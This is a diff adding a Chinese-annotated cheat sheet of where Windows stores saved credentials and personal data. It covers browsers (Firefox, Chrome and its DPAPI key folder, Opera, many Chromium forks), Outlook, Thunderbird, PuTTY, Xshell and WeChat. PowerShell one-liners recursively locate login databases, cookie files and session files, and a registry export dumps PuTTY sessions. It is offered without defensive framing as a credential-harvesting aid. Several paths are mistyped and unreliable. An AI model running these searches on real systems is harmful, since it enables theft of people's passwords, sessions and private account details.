@@ -1,0 +1,61 @@
+#firefox
+C:\Users\<用户名>\AppData\Roaming\Mozilla\Firefox\Profiles\<id>\(key3.db signons.sqlite logins.json key4.db)
+eg：((dir env:appdata |Select-Object -Expandproperty value) + "\Mozilla\Firefox\Profiles\" |  Get-ChildItem -Recurse -Include *logins.json,*.db,*signons.sqlite,*cookies.sqlite,*places.sqlite |Select-Object FullName).FullName
+
+#chrome
+C:\Users\<用户名>\AppData\Local\Google\Chrome\User Data\Default\Login Data
+C:\Users\<用户名>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2442224878-3138507210-4080188441-1001\*	(文件为隐藏属性)
+eg：((dir env:appdata |Select-Object -Expandproperty value) + "\..\Roaming\Microsoft\Protect" | Get-ChildItem -Recurse -Include * -Hidden | Select-Object FullName).FullName
+
+#opera
+C:\Users\<用户名>\AppData\Roaming\Opera Software\Opera Stable\Login Data
+eg：((dir env:appdata |Select-Object -Expandproperty value) + "\Opera Software\Opera Stable" | Get-ChildItem -Recurse -Include "Login Data"| Select-Object FullName).FullName
+
+#browser
+C:\Users\<用户名>\AppDat\local\Yandex\andexbrowser\Ya Passman Data
+C:\Users\<用户名>\AppDat\local\Vivaldi\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\CentBrowser\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Comodo\Dragon\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Chedot\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Orbitum\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\\local\Chromium\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Slimjet\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Xvast\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\Iridium\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\\local\Kinza\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\CocCoc\Browser\User Data\Default\Login Data
+C:\Users\<用户名>\AppDat\local\AVAST Software\Browser\User Data\Default\Login Data
+C:\Users\<用户名>\local\AVAST Software\Browser\User Data\Default\  *logins.json,*.db
+
+#outlook
+C:\Users\<用户名>\local\\Microsoft\Outlook\ *.pst
+eg：((dir env:appdata |Select-Object -Expandproperty value) + "\..\local\\Microsoft\Outlook\" | Get-ChildItem -Recurse -Include *.pst| Select-Object FullName).FullName
+
+#Thunderbird
+eg：$test21 =  ((dir env:appdata |Select-Object -Expandproperty value) + "\Thunderbird\Profiles\" |  Get-ChildItem -Recurse -Include *logins.json,*.db |Select-Object FullName).FullName
+
+#windows mail
+C:\Users\<用户名>\AppData\Local\Microsoft\Windows Live\Contacts
+
+#Geme6 FTP Server
+C:\Program Files\Geme6 FTP Server\Remote Admin\*.ini
+
+#putty
+HKEY_CURRENT_USER\SOFTWARE\SimonTatham
+eg：reg export "HKEY_CURRENT_USER\SOFTWARE\SimonTatham" ($test23)
+
+#xshell
+C:\Users\<用户名>\Documents\NetSarang Computer\7\Xshell\Sessions\*.xsh
+C:\Users\<用户名>\Documents\NetSarang\*.xsh
+eg： ((dir env:appdata |Select-Object -Expandproperty value) + "\..\..\Documents\NetSarang Computer\" | Get-ChildItem -Recurse -Include *.xsh| Select-Object FullName).FullName
+        ((dir env:appdata |Select-Object -Expandproperty value) + "\..\..\Documents\NetSarang\" | Get-ChildItem -Recurse -Include *.xsh| Select-Object FullName).FullName
+
+
+#网易云userid
+C:\Users\<用户名>\AppData\Local\Netease\CloudMusic\info
+
+#微信ID及WIFI名位置
+C:\Users\<用户名>\Documents\WeChat Files\All Users\config\config.data
+
+#微信手机号位置
+C:\Users\<用户名>\Documents\WeChat Files\<sx_id>\config\AccInfo.dat
